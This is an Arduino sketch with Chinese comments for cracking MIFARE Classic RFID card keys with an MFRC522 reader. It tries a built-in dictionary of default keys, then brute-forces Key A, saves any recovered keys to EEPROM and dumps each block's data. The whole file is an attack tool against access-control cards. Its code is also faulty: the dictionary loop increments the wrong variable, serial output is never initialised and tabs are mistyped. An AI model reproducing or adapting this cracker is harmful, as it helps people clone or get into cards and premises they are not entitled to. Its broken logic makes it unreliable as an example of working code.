 #include <SPI.h>     //Arduino Uno引脚13,12,11,10 对应 SCK, MOSI, MISO, SS
 #include <MFRC522.h> //可以在Library中下载
 #include <EEPROM.h> //可以在Library中下载

 #define RST_PIN 9
 #define SS_PIN 10

 MFRC522 mfrc522(SS_PIN, RST_PIN);  // 创建MFRC522模型实例，定义ss和reset输入
 
 MFRC522::StatusCode status;
 MFRC522::MIFARE_Key key;

 int key_1=0;
 int key_2=0;
 int key_3=0;
 int key_4=0;
 int key_5=0;
 int key_6=0;

 byte block  = 0; //结构：0～15块，每块的第四区存有6bit keyA，4bit 控制字, 6 bit KeyB
 byte buffer[18]; //预留区读取缓存

 byte Defualt_Key[19][6]={{0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
                       {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},
                       {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7},
                       {0xA0,0xB0,0xC0,0xD0,0xE0,0xF0},
                       {0xA1,0xB1,0xC1,0xD1,0xE1,0xF1},
                       {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5},
                       {0x4D,0x3A,0x99,0xC3,0x51,0xDD},
                       {0x1A,0x98,0x2C,0x7E,0x45,0x9A},
                       {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF},
                       {0xB5,0xFF,0x67,0xCB,0xA9,0x51},
                       {0x71,0x4C,0x5C,0x88,0x6E,0x97},
                       {0x58,0x7E,0xE5,0xF9,0x35,0x0F},
                       {0xA0,0x47,0x8C,0xC3,0x90,0x91},
                       {0x53,0x3C,0xB6,0xC7,0x23,0xF6},
                       {0x24,0x02,0x00,0x00,0xDB,0xFD},
                       {0x00,0x00,0x12,0xED,0x12,0xED},
                       {0x8F,0xD0,0xA4,0xF2,0x56,0xE9},
                       {0xEE,0x9B,0xD3,0x61,0xB0,0x1B},
                       {0x00,0x00,0x00,0x00,0x00,0x00}};

 void setup() 
 {
   SPI.begin(); // SPI初始化
   mfrc522.PCD_Init(); // MFRC522初始化
   for (byte i = 0; i < 6; i++) key.keyByte[i] = 0x00; //初始化字典
 }
 
 void loop() 
 {
  if (block > 15) return;
   
  if (!mfrc522.PICC_IsNewCardPresent()) //检查是否有卡
    return;
 
  if (!mfrc522.PICC_ReadCardSerial()) // 验证NUID是否可读
    return;
 
  Serial.print("Card UID:");    //可读则输出UID
  for (byte i = 0; i < mfrc522.uid.size; i++) {
    Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? " 0" : " ");
    Serial.print(mfrc522.uid.uidByte[i], HEX);
  } 
  Serial.print(" PICC type: ");   // 可读则输出卡的type
  byte piccType = mfrc522.PICC_GetType(mfrc522.uid.sak);
  if (piccType != MFRC522::PICC_TYPE_MIFARE_MINI &&  
    piccType != MFRC522::PICC_TYPE_MIFARE_1K &&
    piccType != MFRC522::PICC_TYPE_MIFARE_4K) {
    Serial.println("不支持读取此卡");
    return;
  }else{
  Serial.println(mfrc522.PICC_GetTypeName(piccType));
  }
  
  mfrc522.PICC_DumpDetailsToSerial(&(mfrc522.uid));
 
  //默认密码破解
  for (byte i=0;i<19;i++){
   for (byte j=0;i<6;i++){
    key.keyByte[j] = Defualt_Key[i][j];
   }
    status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(mfrc522.uid));
    if (status == MFRC522::STATUS_OK) {
       delay(5000);
       Serial.print("PCD_Authenticate OK");
       EEPROM.write(block*6,key.keyByte[0]);
       EEPROM.write(block*6+1,key.keyByte[1]);
       EEPROM.write(block*6+2,key.keyByte[2]);
       EEPROM.write(block*6+3,key.keyByte[3]);
       EEPROM.write(block*6+4,key.keyByte[4]);
       EEPROM.write(block*6+5,key.keyByte[5]);

       // 读取区中数据
       byte byteCount = sizeof(buffer);
       status = mfrc522.MIFARE_Read(block, buffer, &byteCount);
       if (status != MFRC522::STATUS_OK) {
         Serial.print("MIFARE_Read() failed: ");
         Serial.println(mfrc522.GetStatusCodeName(status));
       }
       else{
         Serial.println("当前区的HEX数据: ");
         printHex16(buffer, 16);
         Serial.println("当前区的DEC数据: ");
         printDec16(buffer, 16);
       }

      Serial.println("Key is: ");
      printHex(key.keyByte, MFRC522::MF_KEY_SIZE);
      Serial.print("Block:");
      Serial.println(block);

      block++;
      mfrc522.PICC_HaltA(); // Halt PICC
      mfrc522.PCD_StopCrypto1();  // Stop encryption on PCD
      return;
     }else{
      Serial.println("Just Now trying: ");
      printHex(key.keyByte, MFRC522::MF_KEY_SIZE);
      Serial.print("Block:");
      Serial.println(block);
     }
 }

  //暴力破解
  for (key_1=0;key_1<256;key_1++){
   for (key_2=0;key_2<256;key_2++){
    for (key_3=0;key_3<256;key_3++){
     for (key_4=0;key_4<256;key_4++){
      for (key_5=0;key_5<256;key_5++){
       for (key_6=0;key_6<256;key_6++){
           key={(unsigned char)key_1,(unsigned char)key_2,(unsigned char)key_3,(unsigned char)key_4,(unsigned char)key_5,(unsigned char)key_6};
           status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(mfrc522.uid));
           if (status == MFRC522::STATUS_OK) {
              delay(5000);
              Serial.print("PCD_Authenticate OK");
              EEPROM.write(block*6,key_1);
              EEPROM.write(block*6+1,key_2);
              EEPROM.write(block*6+2,key_3);
              EEPROM.write(block*6+3,key_4);
              EEPROM.write(block*6+4,key_5);
              EEPROM.write(block*6+5,key_6);
  
              // 读取区中数据
              byte byteCount = sizeof(buffer);
              status = mfrc522.MIFARE_Read(block, buffer, &byteCount);
              if (status != MFRC522::STATUS_OK) {
                Serial.print("MIFARE_Read() failed: ");
                Serial.println(mfrc522.GetStatusCodeName(status));
              }
              else{
                Serial.println("当前区的HEX数据: ");
                printHex16(buffer, 16);
                Serial.println("当前区的DEC数据: ");
                printDec16(buffer, 16);
              }
     
             Serial.println("Key is: ");
             printHex(key.keyByte, MFRC522::MF_KEY_SIZE);
             Serial.print("Block:");
             Serial.println(block);

             key_1=0;
             key_2=0;
             key_3=0;
             key_4=0;
             key_5=0;
             key_6=0;  
             block++;
             mfrc522.PICC_HaltA(); // Halt PICC
             mfrc522.PCD_StopCrypto1();  // Stop encryption on PCD
             return;
            }else{
             Serial.println("Just Now trying: ");
             printHex(key.keyByte, MFRC522::MF_KEY_SIZE);
             Serial.print("Block:");
             Serial.println(block);
            }
       }
      }
     }
    }
   }
  }       
}

void printHex(byte *Buffer, byte BufferSize) {
  for (byte i = 0; i < BufferSize; i++) {
    Serial.print(Buffer[i] < 0x10 ? " 0" : " ");
    Serial.print(Buffer[i], HEX);
    if ((i % 6) == 5) Serial.print("/t");
  }
}

void printHex16(byte *Buffer, byte BufferSize) {
  for (byte i = 0; i < BufferSize; i++) {
    Serial.print(Buffer[i] < 0x10 ? " 0" : " ");
    Serial.print(Buffer[i], HEX);
    if ((i % 16) == 15) Serial.print("/t");
  }
}

void printDec16(byte *Buffer, byte BufferSize) {
  for (byte i = 0; i < BufferSize; i++) {
    Serial.print(Buffer[i] < 0x10 ? " 0" : " ");
    Serial.print(Buffer[i], DEC);
    if ((i % 16) == 15) Serial.print("/t");
  }
}
